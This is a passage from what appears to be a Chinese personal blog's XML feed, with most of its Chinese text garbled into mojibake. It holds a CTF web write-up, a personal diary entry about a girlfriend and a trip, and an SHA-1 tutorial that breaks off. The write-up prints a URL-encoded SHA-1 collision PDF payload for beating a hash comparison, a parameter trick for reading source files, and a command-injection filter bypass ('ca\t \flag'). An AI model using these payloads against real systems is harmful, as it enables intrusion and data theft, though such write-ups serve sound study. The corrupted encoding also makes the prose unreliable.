class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((string)$_GET[<span class="hljs-string">&#x27;a&#x27;</span>]!==(string)$_GET[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])===md5($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>    echo <span class="hljs-string">&quot;Xsw6_a&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131658.png" alt="QQæˆªå›¾20220228210215"></p><h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><h2 id="åˆæ­¥"><a href="#åˆæ­¥" class="headerlink" title="åˆæ­¥"></a>åˆæ­¥</h2><p>æ‰“å¼€é¢˜ç›®å°±çœ‹åˆ°urlï¼š<a href="http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=">http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p>imgåé¢è‚¯å®šæ˜¯åŠ å¯†ï¼ˆF12æ‰“å¼€å°±çœ‹åˆ°base64ï¼‰ï¼Œcmdç”¨æ¥å¹²ä»€ä¹ˆï¼Ÿæ‰§è¡Œå‘½ä»¤å‘—ã€‚<br>ç„¶åbase64è§£å¯†ä¸€ä¸‹ã€‚emmmï¼Œä»€ä¹ˆç©æ„ã€‚ä¸¤æ¬¡base64è§£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131468.png" alt="QQæˆªå›¾20220228210724"></p><p>å±å®çœ‹ä¸æ‡‚ã€‚ç›´æ¥æŸ¥çœ‹é¢˜ç›®ç»™çš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br></code></pre></td></tr></table></figure><p><code>hex2bin</code><strong>è§£ç åå…­è¿›åˆ¶ç¼–ç çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</strong><br>è§£ç ä¸º555.pngã€‚</p><h2 id="é«˜æ½®"><a href="#é«˜æ½®" class="headerlink" title="é«˜æ½®"></a>é«˜æ½®</h2><p>å¾ˆæ˜¾ç„¶è¿™é‡Œæˆ‘ä»¬åœ¨çœ‹è¿‡æºç ä¹‹åï¼Œå¯ä»¥ç›´æ¥ç»§ç»­å¾€ä¸‹è¯»ã€‚ä½†æ˜¯åœ¨çœŸæ­£çš„æ¯”èµ›çš„æ—¶å€™ã€‚è¿™æ—¶å€™æˆ‘ä»¬åº”è¯¥</p><p><code>$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</code></p><p>è¿™æ—¶å€™æˆ‘ä»¬åº”è¯¥å°†imgæ”¹æˆindex.phpæ–¹å‘åŠ å¯†å¾—åˆ°ã€‚</p><p>æ‰€ç”¨ç½‘å€ï¼š</p><p><a href="https://tool.lu/hexstr/">https://tool.lu/hexstr/</a></p><p><a href="https://tool.oschina.net/encrypt?type=3">https://tool.oschina.net/encrypt?type=3</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">TmprMlpUWTBOalUzT<span class="hljs-number">0</span>RKbE<span class="hljs-number">56</span>QTJPRG<span class="hljs-symbol">N3</span><br></code></pre></td></tr></table></figure><p>ç„¶åF12ï¼ŒæŸ¥çœ‹åˆ°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282124825.png" alt="QQæˆªå›¾20220228212429"></p><p>è§£ç åçœ‹åˆ°æºç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131307.png" alt="QQæˆªå›¾20220228212459"></p><p>åç»­å°±æ˜¯ç»•è¿‡MD5ï¼ˆéå¸¸å¯æ¶ï¼ï¼‰<br>è¿™é‡Œè¿˜æœ‰ä¸ªå°tipsã€‚ï¼ˆæºç ä¸­è¿‡æ»¤äº†ä¸€äº›å‘½ä»¤ã€‚ï¼‰<br>å¯ä»¥è¿™ä¹ˆæ„é€ ï¼ˆca&#x2F;t \flagï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131419.png" alt="QQæˆªå›¾20220228212459"></p><p>æ„Ÿè°¢<code>h3å¸ˆå‚…ã€å¤©ä¸Šæ˜Ÿå¸ˆå‚…</code></p><p>ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æƒ³å¿µå®è´</title>
    <link href="/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/"/>
    <url>/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/</url>
    
    <content type="html"><![CDATA[<p>æ¯ä¸€å‘¨æ€»ç»“å†™ä¸€ç¯‡å­ï¼ˆäº‰å–ï¼‰ï¼Œå¸Œæœ›å®è´ä¸ä¼šè§‰å¾—å¹³å¸¸å­¦ä¸œè¥¿å¿˜äº†å¥¹ã€‚è™½ç„¶è¯´æ˜¯åœ¨ä¸€ä¸ªå­¦æ ¡ï¼Œä½†æ˜¯å› ä¸ºç–«æƒ…åŸå› éš”äº†åä¸‡å…«åƒé‡Œã€‚</p><p>ä»Šå¤©è¿˜è·Ÿå©†å©†æ‰“ç”µè¯äº†ï¼Œå©†å©†èº«ä½“ä¹‹å‰ä¸€ç›´ä¸å¥½ï¼Œä»Šå¤©ç»ˆäºå¥½äº›äº†ã€‚ï¼ˆå¸Œæœ›æ—©ç‚¹é•¿å¤§ï¼Œå¯ä»¥èµšç‚¹å°é’±ï¼Œå­æ•¬å¥¹è€äººå®¶ï¼‰</p><h1 id="æœ‰ç‚¹æƒ³å®è´äº†"><a href="#æœ‰ç‚¹æƒ³å®è´äº†" class="headerlink" title="æœ‰ç‚¹æƒ³å®è´äº†"></a>æœ‰ç‚¹æƒ³å®è´äº†</h1><p>å‰å‡ å¤©è®¡åˆ’å»å³¨çœ‰å±±ç©ä¸€åœˆï¼ˆå¸Œæœ›åˆ°æ—¶å€™ä¸ä¼šä¸‹é›¨ï¼‰ã€‚çœŸçš„å°±ç¦»è°±è®¢é…’åº—çš„ç¥¨æ˜¯çœŸçš„è´µï¼ˆ499ä¸€æ™šï¼‰ã€‚<br>ä¸‹é¢æ˜¯è®¡åˆ’è¡¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272111813.jpeg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>å­¦ç”Ÿæ—¶ä»£çš„æ‹çˆ±</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ±æƒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHA-1ç®—æ³•</title>
    <link href="/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/"/>
    <url>/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="SHA-1ç®—æ³•"><a href="#SHA-1ç®—æ³•" class="headerlink" title="SHA-1ç®—æ³•"></a>SHA-1ç®—æ³•</h1><p><strong>SHA-1</strong>ï¼ˆè‹±è¯­ï¼šSecure Hash Algorithm 1ï¼Œä¸­æ–‡åï¼šå®‰å…¨æ•£åˆ—ç®—æ³•1ï¼‰æ˜¯ä¸€ç§å¯†ç æ•£åˆ—å‡½æ•°ã€‚SHA-1å¯ä»¥ç”Ÿæˆä¸€ä¸ªè¢«ç§°ä¸ºæ¶ˆæ¯ï¼ˆå°äº2^64ï¼‰æ‘˜è¦çš„160<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D">ä½</a>ï¼ˆ20<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">å­—èŠ‚</a>ï¼‰æ•£åˆ—å€¼ï¼Œæ•£åˆ—å€¼é€šå¸¸çš„å‘ˆç°å½¢å¼ä¸º40ä¸ª<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">åå…­è¿›åˆ¶</a>æ•°ã€‚</p><h2 id="å¯†ç æ•£åˆ—å‡½æ•°"><a href="#å¯†ç æ•£åˆ—å‡½æ•°" class="headerlink" title="å¯†ç æ•£åˆ—å‡½æ•°"></a>å¯†ç æ•£åˆ—å‡½æ•°</h2><p><strong>å¯†ç æ•£åˆ—å‡½æ•°</strong>ï¼ˆè‹±è¯­ï¼šCryptographic hash functionï¼‰ï¼Œåˆè¯‘ä¸º<strong>åŠ å¯†æ•£åˆ—å‡½æ•°</strong>ã€<strong>å¯†ç æ•£åˆ—å‡½æ•°</strong>ã€<strong>åŠ å¯†æ•£åˆ—å‡½æ•°</strong>ï¼Œæ˜¯<a href="https://zh.wikipedia.org/wiki/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B8">æ•£åˆ—å‡½æ•°</a>çš„ä¸€ç§ã€‚å®ƒè¢«è®¤ä¸ºæ˜¯ä¸€ç§<a href="https://zh.wikipedia.org/wiki/%E5%96%AE%E5%90%91%E5%87%BD%E6%95%B8">å•å‘å‡½æ•°</a>ï¼Œä¹Ÿå°±æ˜¯è¯´æå…¶éš¾ä»¥ç”±æ•£åˆ—å‡½æ•°è¾“å‡ºçš„ç»“æœï¼Œå›æ¨è¾“å…¥çš„èµ„æ–™æ˜¯ä»€ä¹ˆã€‚è¿™æ ·çš„å•å‘å‡½æ•°è¢«ç§°ä¸ºâ€œç°ä»£å¯†ç å­¦çš„é©®é©¬â€ã€‚</p><h2 id="SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤"><a href="#SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤" class="headerlink" title="SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤"></a>SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272048527.jpg" alt="153211996026408701"></p><h3 id="æœ¯è¯­çš„æ¦‚å¿µ"><a href="#æœ¯è¯­çš„æ¦‚å¿µ" class="headerlink" title="æœ¯è¯­çš„æ¦‚å¿µ"></a>æœ¯è¯­çš„æ¦‚å¿µ</h3><h4 id="1ä½-Bit-ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰"><a href="#1ä½-Bit-ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰" class="headerlink" title="1ä½(Bit)ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰"></a>1ä½(Bit)ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰</h4><p>SHA1å§‹ç»ˆæŠŠæ¶ˆæ¯å½“æˆä¸€ä¸ªä½ï¼ˆbitï¼‰å­—ç¬¦ä¸²æ¥å¤„ç†ã€‚æ¯”å¦‚ï¼Œå­—ç¬¦ä¸²â€œabcâ€å¯ä»¥è¢«è½¬æ¢æˆä¸€ä¸ªä½å­—ç¬¦ä¸²ï¼š<code>01100001 01100010 01100011</code>ã€‚å®ƒä¹Ÿå¯ä»¥è¢«è¡¨ç¤ºæˆ16è¿›åˆ¶å­—ç¬¦ä¸²: <code>0x616263</code>ã€‚</p><h4 id="è¿ç®—ç¬¦å’Œç¬¦å·"><a href="#è¿ç®—ç¬¦å’Œç¬¦å·" class="headerlink" title="è¿ç®—ç¬¦å’Œç¬¦å·"></a>è¿ç®—ç¬¦å’Œç¬¦å·</h4><p>ä¸‹é¢çš„é€»è¾‘è¿ç®—ç¬¦éƒ½è¢«è¿ç”¨äºâ€œå­—â€ï¼ˆWordï¼‰</p><p>X<code>^</code>ã€<code>&amp;</code>Y  &#x3D; Xï¼Œ Yé€»è¾‘ä¸</p><p>X <code>\/</code> Y  &#x3D; Xï¼Œ Yé€»è¾‘æˆ–</p><p>X <code>XOR</code> Y&#x3D; Xï¼Œ Yé€»è¾‘å¼‚æˆ–</p><p><code>~</code>X   &#x3D;  Xé€»è¾‘å–å</p><p>X<code>+</code>Yå®šä¹‰å¦‚ä¸‹ï¼š</p><p>å­— X å’Œ Y ä»£è¡¨ä¸¤ä¸ªæ•´æ•° x å’Œy, å…¶ä¸­ 0 &lt;&#x3D; x &lt; 2^32 ä¸” 0 &lt;&#x3D; y &lt; 2^32. ä»¤æ•´æ•°z &#x3D; (x + y) mod 2^32. è¿™æ—¶å€™ 0 &lt;&#x3D; z &lt; 2^32. å°†zè½¬æ¢æˆå­—Z, é‚£ä¹ˆå°±æ˜¯ Z &#x3D; X + Y.</p><p>å¾ªç¯å·¦ç§»ä½æ“ä½œç¬¦Sn(X)ã€‚Xæ˜¯ä¸€ä¸ªå­—ï¼Œnæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œ0&lt;&#x3D;n&lt;&#x3D;32ã€‚Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p><strong>X&lt;&lt;nå®šä¹‰å¦‚ä¸‹</strong>ï¼šæŠ›å¼ƒæœ€å·¦è¾¹çš„nä½æ•°å­—ï¼Œå°†å„ä¸ªä½ä¾æ¬¡å‘å·¦ç§»åŠ¨nä½ï¼Œç„¶åç”¨0å¡«è¡¥å³è¾¹çš„nä½ï¼ˆæœ€åç»“æœè¿˜æ˜¯32ä½ï¼‰ã€‚</p><p><strong>X&gt;&gt;nå®šä¹‰å¦‚ä¸‹</strong>ï¼šX&gt;&gt;næ˜¯æŠ›å¼ƒå³è¾¹çš„nä½ï¼Œå°†å„ä¸ªä½ä¾æ¬¡å‘å³ç§»åŠ¨nä½ï¼Œç„¶ååœ¨å·¦è¾¹çš„nä½å¡«0ã€‚å› æ­¤å¯ä»¥å«Sn(X)ä½å¾ªç¯ç§»ä½è¿ç®—</p><h3 id="å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²"><a href="#å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²" class="headerlink" title="å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²"></a>å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²</h3><p>å› ä¸ºåœ¨Sha-1ç®—æ³•ä¸­ï¼Œå®ƒçš„è¾“å…¥å¿…é¡»ä¸ºä½ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦å°†å…¶è½¬åŒ–ä¸ºä½å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬ä»¥â€œabcâ€å­—ç¬¦ä¸²æ¥è¯´æ˜é—®é¢˜ã€‚</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;a&#x27;=97       &#x27;b&#x27;=98       &#x27;c&#x27;=99<br>&#x27;a&#x27;=01100001 &#x27;b&#x27;=01100010 &#x27;c&#x27;=01100011<br></code></pre></td></tr></table></figure><h3 id="å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ"><a href="#å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ" class="headerlink" title="å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ"></a>å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ</h3><p>Sha-1ç®—æ³•æ ‡å‡†è§„å®šï¼Œå¿…é¡»å¯¹æ¶ˆæ¯æ‘˜è¦è¿›è¡Œè¡¥ä½æ“ä½œï¼Œå³å°†è¾“å…¥çš„æ•°æ®è¿›è¡Œå¡«å……ï¼Œä½¿å¾—æ•°æ®é•¿åº¦å¯¹512æ±‚ä½™çš„ç»“æœä¸º448ï¼Œå¡«å……æ¯”ç‰¹ä½çš„æœ€é«˜ä½è¡¥ä¸€ä¸ª1ï¼Œå…¶ä½™çš„ä½è¡¥0ï¼Œå¦‚æœåœ¨è¡¥ä½ä¹‹å‰å·²ç»æ»¡è¶³å¯¹512å–æ¨¡ä½™æ•°ä¸º448ï¼Œä¹Ÿè¦è¿›è¡Œè¡¥ä½ï¼Œåœ¨å…¶åè¡¥ä¸€ä½1å³å¯ã€‚æ€»ä¹‹ï¼Œè¡¥ä½æ˜¯è‡³å°‘è¡¥ä¸€ä½ï¼Œæœ€å¤šè¡¥512ä½ï¼Œæˆ‘ä»¬ä¾ç„¶ä»¥â€œabcâ€ä¸ºä¾‹ï¼Œå…¶è¡¥ä½è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>åˆå§‹çš„ä¿¡æ¯æ‘˜è¦ï¼š<code>01100001 01100010 01100011</code></p><p>ç¬¬ä¸€æ­¥è¡¥ä½ï¼š   <code>01100001 01100010 01100011 1</code>ï¼ˆå¡«å……ä½ï¼‰</p><p>â€¦..        â€¦â€¦</p><p>è¡¥ä½æœ€åä¸€ä½ï¼š  <code>01100001 01100010 01100011 10.......0</code>(åé¢è¡¥äº†423ä¸ª0)</p><p>è€Œåæˆ‘ä»¬å°†è¡¥ä½æ“ä½œåçš„ä¿¡æ¯æ‘˜è¦è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><code>61626380 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000</code> Â·Â·Â·Â·Â·Â·</p><p>(è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯61626380 ä»£è¡¨çš„åˆšå¥½æ˜¯4ä¸ª8ä½äºŒè¿›åˆ¶æ•°ï¼Œä¹Ÿå°±æ˜¯æŒ‡çš„æ˜¯<code>01100001 01100010 01100011 10000000</code>)</p><h3 id="é™„åŠ é•¿åº¦å€¼"><a href="#é™„åŠ é•¿åº¦å€¼" class="headerlink" title="é™„åŠ é•¿åº¦å€¼"></a>é™„åŠ é•¿åº¦å€¼</h3><p>åœ¨ä¿¡æ¯æ‘˜è¦åé¢é™„åŠ 